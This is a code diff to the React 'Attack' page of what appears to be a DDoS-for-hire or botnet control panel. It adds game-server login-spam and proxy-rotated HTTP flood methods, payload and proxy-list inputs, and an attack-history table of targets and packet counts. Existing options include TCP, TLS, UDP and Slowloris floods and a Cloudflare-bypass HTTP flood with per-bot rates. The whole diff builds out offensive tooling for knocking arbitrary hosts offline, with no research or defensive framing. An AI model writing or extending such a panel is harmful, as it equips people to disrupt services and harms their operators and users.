@@ -11,9 +11,11 @@ interface Attack {
 }
 
 const METHODS = [
-  { id: 'MEGA', desc: 'TCP connection flood (exhaust target FDs)' },
-  { id: 'TLS_EXHAUST', desc: 'TLS exhaust (2048 conns)' },
-  { id: 'HTTP', desc: 'HTTP flood — keep-alive pool, bypass CF' },
+  { id: 'MEGA', desc: 'TCP flood + TLS — exhaust FDs + TLS resources' },
+  { id: 'TLS_EXHAUST', desc: 'TCP flood + TLS (same as MEGA)' },
+  { id: 'GAME', desc: 'NRO game socket — login spam + DB overload' },
+  { id: 'HTTP_PROXY', desc: 'HTTP through proxy list (free IP rotation)' },
+  { id: 'HTTP', desc: 'HTTP direct flood (keep-alive pool)' },
   { id: 'SLOWLORIS', desc: 'Slowloris (512 conns)' },
   { id: 'UDP', desc: 'UDP flood (bandwidth-heavy)' },
 ];
@@ -24,9 +26,11 @@ export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
   const [form, setForm] = useState({
     target_host: '', target_port: 80, method: 'MEGA', duration_secs: 60,
     pps_per_bot: 100000, bot_count: 1, mega_mode: false,
+    payload: '', proxies: '',
   });
   const [launching, setLaunching] = useState(false);
   const [err, setErr] = useState('');
+  const [history, setHistory] = useState<Attack[]>([]);
 
   const fetchActive = async () => {
     try {
@@ -35,8 +39,16 @@ export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
     } catch { /* ignore poll errors */ }
   };
 
+  const fetchHistory = async () => {
+    try {
+      const { data } = await api.get('/api/attacks/mine');
+      setHistory(Array.isArray(data) ? data : data?.items || []);
+    } catch { /* ignore */ }
+  };
+
   useEffect(() => {
     fetchActive();
+    fetchHistory();
     const i = setInterval(fetchActive, 3000);
     return () => clearInterval(i);
   }, []);
@@ -175,6 +187,18 @@ export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
               MEGA
             </label>
           </div>
+          {form.method === 'GAME' && (
+            <div>
+              <label className="text-xs text-[var(--text-secondary)]">Game Payload (base64)</label>
+              <textarea rows={2} placeholder="Paste base64-encoded game packet..." className="w-full bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl px-3 py-2 text-xs font-mono" value={form.payload} onChange={e => setForm(f => ({ ...f, payload: e.target.value }))} />
+            </div>
+          )}
+          {form.method === 'HTTP_PROXY' && (
+            <div>
+              <label className="text-xs text-[var(--text-secondary)]">Proxy List (optional — auto-fetch if empty)</label>
+              <textarea rows={2} placeholder="Leave empty for auto-fetch, or paste ip:port per line..." className="w-full bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl px-3 py-2 text-xs font-mono" value={form.proxies} onChange={e => setForm(f => ({ ...f, proxies: e.target.value }))} />
+            </div>
+          )}
           <div className="flex items-end">
             <button
               onClick={launch}
@@ -232,6 +256,42 @@ export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
                       <StopCircle className="w-3.5 h-3.5" />
                     </button>
                   </td>
+                </tr>
+              ))}
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      {/* Attack History */}
+      <div className="mt-6 bg-[var(--bg-secondary)] border border-[var(--border)] rounded-2xl overflow-hidden">
+        <div className="px-6 py-4 border-b border-[var(--border)]">
+          <h3 className="text-sm font-semibold flex items-center gap-2">
+            <Clock className="w-4 h-4 text-[var(--text-muted)]" />
+            Attack History
+          </h3>
+        </div>
+        <div className="overflow-x-auto">
+          <table className="w-full">
+            <thead className="bg-[var(--bg-primary)]/50">
+              <tr>
+                <th className="p-4 text-left text-[10px] font-semibold uppercase text-[var(--text-muted)]">Target</th>
+                <th className="p-4 text-left text-[10px] font-semibold uppercase text-[var(--text-muted)]">Method</th>
+                <th className="p-4 text-left text-[10px] font-semibold uppercase text-[var(--text-muted)]">Status</th>
+                <th className="p-4 text-left text-[10px] font-semibold uppercase text-[var(--text-muted)]">Packets</th>
+                <th className="p-4 text-left text-[10px] font-semibold uppercase text-[var(--text-muted)]">Started</th>
+              </tr>
+            </thead>
+            <tbody>
+              {history.length === 0 ? (
+                <tr><td colSpan={5} className="p-8 text-center text-[var(--text-muted)] text-xs">No attack history</td></tr>
+              ) : history.slice(0, 20).map(a => (
+                <tr key={a.id} className="border-b border-[var(--border)]/50">
+                  <td className="p-4 text-xs font-mono">{a.target_host}:{a.target_port}</td>
+                  <td className="p-4"><span className="px-2 py-0.5 rounded text-[10px] font-medium bg-[var(--bg-primary)] border border-[var(--border)] text-[var(--text-secondary)]">{a.method}</span></td>
+                  <td className="p-4 text-xs">{a.status || '—'}</td>
+                  <td className="p-4 text-xs font-mono text-[var(--text-secondary)]">{(a.total_packets || 0).toLocaleString()}</td>
+                  <td className="p-4 text-xs text-[var(--text-muted)]">{a.started_at ? new Date(a.started_at).toLocaleString() : '—'}</td>
                 </tr>
               ))}
             </tbody>
